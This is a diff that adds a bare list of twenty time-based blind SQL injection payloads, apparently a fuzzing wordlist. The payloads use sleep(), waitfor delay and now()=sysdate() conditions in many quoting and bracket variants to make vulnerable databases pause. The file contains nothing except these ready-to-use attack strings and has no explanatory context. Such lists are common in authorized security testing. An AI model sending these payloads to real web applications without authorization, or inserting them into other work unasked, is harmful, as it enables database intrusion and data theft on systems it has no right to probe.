@@ -1,0 +1,20 @@
+" or sleep(5)="
+' or sleep(5)='
+1) or sleep(5)#
+") or sleep(5)="
+') or sleep(5)='
+1)) or sleep(5)#
+")) or sleep(5)="
+')) or sleep(5)='
+;waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+100 AND (SELECT 5273 FROM (SELECT(SLEEP(5)))NbfO)
+XOR(if(now()=sysdate(),sleep(5),0))XOR
+1'XOR(if(now()=sysdate(),sleep(3*2),0))XOR'Z
+0'XOR(if(now()=sysdate(),sleep(15),0))XOR'Z
+WHEN(LENGTH(version())=10)THEN(SLEEP(10*1))END
+if(now()=sysdate(),sleep(xx),0) 
+' AND (SELECT 5855 FROM (SELECT(SLEEP(10)))gveI) OR 'lAoI'='YrBJ
+(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+"0"XOR(if(now()=sysdate()%2Csleep(6)%2C0))XOR"Z"
+(select*from(select(sleep(5)))a)
